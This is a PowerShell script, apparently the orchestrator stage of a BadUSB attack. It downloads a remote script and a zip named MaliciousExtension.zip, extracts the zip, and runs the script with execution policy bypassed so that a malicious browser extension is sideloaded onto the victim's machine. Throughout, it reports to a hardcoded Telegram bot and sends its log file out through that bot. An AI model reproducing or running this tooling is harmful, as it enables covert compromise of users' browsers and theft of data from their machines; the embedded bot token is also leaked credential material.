# Sideload-Orchestrator.ps1
# Downloads components and orchestrates the sideloading.

# --- Configuration ---
$Global:LogFile = "$env:TEMP\sideload_orchestrator_log.txt" # Make log file path global

# << REPLACE THESE URLS >>
$MainSideloadScriptUrl = "https://gist.githubusercontent.com/YOUR_USER/YOUR_GIST_ID_SIDELOAD_EXT/raw/Sideload-Extension.ps1"
$ExtensionZipUrl = "https://github.com/L7Dawson/badusb/raw/refs/heads/main/MaliciousExtension.zip"
# << END OF URLS >>

$TempDir = "$env:TEMP\BrowserMod_Payload"
$MainSideloadScriptPath = Join-Path $TempDir "Sideload-Extension.ps1"
$ExtensionZipPath = Join-Path $TempDir "MyMaliciousExtension.zip"
$ExtractedExtensionPath = Join-Path $TempDir "MyMaliciousExtension"

# --- Functions ---
function Write-Log {
    param([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp] $Message"
    Write-Host $LogEntry
    Add-Content -Path $Global:LogFile -Value $LogEntry -ErrorAction SilentlyContinue
}

function Send-TelegramNotification {
    param([string]$TextMessage)
    $TelegramToken = "7565111023:AAHut-ZUJyU4E5ySxXXNNLOSHq4VPS8e6ZQ" # Your Bot Token
    $TelegramChatID = "6847777757" #userID
    
    $SafeMessage = "[Orchestrator: $($env:COMPUTERNAME)]`n" + $TextMessage.Substring(0, [System.Math]::Min($TextMessage.Length, 3800)) # Keep it under limit
    try {
        Add-Type -AssemblyName System.Web -ErrorAction SilentlyContinue # For HttpUtility.UrlEncode if not already loaded
        $EncodedMessage = [System.Web.HttpUtility]::UrlEncode($SafeMessage)
        $TelegramApiUrl = "https://api.telegram.org/bot$TelegramToken/sendMessage?chat_id=$TelegramChatID&text=$EncodedMessage&parse_mode=Markdown"
        Invoke-RestMethod -Uri $TelegramApiUrl -Method Get -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
        Write-Log "Sent Telegram notification."
    }
    catch {
        Write-Log "Error sending Telegram notification: $($_.Exception.Message)"
    }
}

# --- Main Logic ---
Clear-Content -Path $Global:LogFile -ErrorAction SilentlyContinue
Write-Log "Sideload Orchestrator Started."
Send-TelegramNotification "Orchestrator script initiated."

# Create temporary directory
if (Test-Path $TempDir) {
    Write-Log "Removing existing temp directory: $TempDir"
    Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
}
New-Item -Path $TempDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
if (-not (Test-Path $TempDir)) {
    Write-Log "FATAL ERROR: Could not create temp directory $TempDir"
    Send-TelegramNotification "FATAL: Could not create temp directory."
    exit 1
}
Write-Log "Created temp directory: $TempDir"

# Download Main Sideloading PowerShell Script
Write-Log "Downloading main sideloading script from: $MainSideloadScriptUrl"
try {
    Invoke-WebRequest -Uri $MainSideloadScriptUrl -OutFile $MainSideloadScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
    Write-Log "Main sideloading script downloaded to: $MainSideloadScriptPath"
}
catch {
    $errMsg = "FATAL ERROR downloading main sideloading script: $($_.Exception.Message)"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# Download Browser Extension ZIP
Write-Log "Downloading extension ZIP from: $ExtensionZipUrl"
try {
    Invoke-WebRequest -Uri $ExtensionZipUrl -OutFile $ExtensionZipPath -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop # Longer timeout for ZIP
    Write-Log "Extension ZIP downloaded to: $ExtensionZipPath"
}
catch {
    $errMsg = "FATAL ERROR downloading extension ZIP: $($_.Exception.Message)"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# Extract Browser Extension
Write-Log "Extracting extension from $ExtensionZipPath to $ExtractedExtensionPath"
try {
    Expand-Archive -Path $ExtensionZipPath -DestinationPath $ExtractedExtensionPath -Force -ErrorAction Stop
    Write-Log "Extension extracted to: $ExtractedExtensionPath"
}
catch {
    $errMsg = "FATAL ERROR extracting extension ZIP: $($_.Exception.Message)"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# Modify the Sideload-Extension.ps1 to use the correct $RemoteExtensionSourcePath
Write-Log "Updating Sideload-Extension.ps1 with correct extension source path: $ExtractedExtensionPath"
try {
    $sideloadScriptContent = Get-Content -Path $MainSideloadScriptPath -Raw
    $placeholder = 'PLACEHOLDER_FOR_EXTENSION_PATH' # Must match placeholder in Sideload-Extension.ps1
    if ($sideloadScriptContent -notmatch [regex]::Escape($placeholder)) {
        $errMsg = "Placeholder '$placeholder' not found in Sideload-Extension.ps1. Cannot update path."
        Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
    }
    $sideloadScriptContent = $sideloadScriptContent.Replace($placeholder, $ExtractedExtensionPath)
    Set-Content -Path $MainSideloadScriptPath -Value $sideloadScriptContent -Force -Encoding UTF8
    Write-Log "Sideload-Extension.ps1 updated."
}
catch {
    $errMsg = "ERROR updating Sideload-Extension.ps1: $($_.Exception.Message)"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# Execute the Main Sideloading Script
Write-Log "Executing main sideloading script: $MainSideloadScriptPath"
$SideloadExitCode = 0
try {
    $process = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$MainSideloadScriptPath`"" -Wait -PassThru -NoNewWindow
    $SideloadExitCode = $process.ExitCode
    Write-Log "Main sideloading script execution finished with exit code: $SideloadExitCode"
    if ($SideloadExitCode -ne 0) {
        Send-TelegramNotification "Sideload-Extension.ps1 exited with code: $SideloadExitCode. Check logs on target."
    } else {
         Send-TelegramNotification "Sideload-Extension.ps1 completed. Check browser(s) after restart. Check target logs."
    }
}
catch {
    $errMsg = "FATAL ERROR executing main sideloading script: $($_.Exception.Message)"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# Exfiltrate the orchestrator log file to Telegram
if (Test-Path $Global:LogFile) {
    $logContent = Get-Content -Path $Global:LogFile -Raw -ErrorAction SilentlyContinue
    if ($logContent) {
        $logSnippet = $logContent.Substring(0, [System.Math]::Min($logContent.Length, 3500))
        $formatString = 'Orchestrator Log (first 3.5k chars):\n```{0}```'
        $telegramMessage = $formatString -f $logSnippet
        Send-TelegramNotification $telegramMessage
    }
}

Write-Log "Sideload Orchestrator Finished."
# Clean up (optional)
# Write-Log "Cleaning up temporary files in $TempDir..."
# Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue